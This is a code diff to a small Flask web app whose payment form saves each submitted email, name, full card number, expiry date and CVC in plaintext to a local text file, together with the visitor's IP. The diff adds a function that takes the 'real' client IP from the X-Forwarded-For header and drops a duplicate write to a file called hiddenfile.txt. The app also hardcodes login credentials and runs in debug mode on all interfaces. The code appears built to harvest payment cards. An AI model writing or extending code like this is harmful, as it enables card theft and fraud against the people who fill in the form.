@@ -1,4 +1,4 @@
-from flask import Flask, render_template, request, redirect, url_for, send_from_directory, abort, render_template_string
+from flask import Flask, render_template, request, redirect, url_for, send_from_directory, render_template_string
 import os
 
 app = Flask(__name__)
@@ -6,6 +6,12 @@ app = Flask(__name__)
 # Set your password and username
 USERNAME = '698445212547825547'
 PASSWORD = 'bevendroxmasc888'
+
+def get_client_ip():
+    if request.headers.getlist("X-Forwarded-For"):
+        return request.headers.getlist("X-Forwarded-For")[0]  # Get the real client IP
+    else:
+        return request.remote_addr  # Fallback to remote_addr
 
 @app.route('/')
 def home():
@@ -38,14 +44,10 @@ def submit_payment():
     card_number = request.form.get('card-number')
     expiry = request.form.get('expiry')  # MM/YY format
     cvc = request.form.get('cvc')
-    user_ip = request.remote_addr  # Get the user's IP
+    user_ip = get_client_ip()  # Get the user's real IP
 
     # Save the payment information to payment_info.txt
     with open('payment_info.txt', 'a') as f:
-        f.write(f"Email: {email}, Name: {name}, Card Number: {card_number}, Expiry: {expiry}, CVC: {cvc}, User IP: {user_ip}\n")
-
-    # Save to hiddenfile.txt
-    with open('hiddenfile.txt', 'a') as f:
         f.write(f"Email: {email}, Name: {name}, Card Number: {card_number}, Expiry: {expiry}, CVC: {cvc}, User IP: {user_ip}\n")
 
     return redirect(url_for('home'))  # Redirect to the home page or another page
@@ -79,4 +81,3 @@ def hidden_file():
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)), debug=True)
-
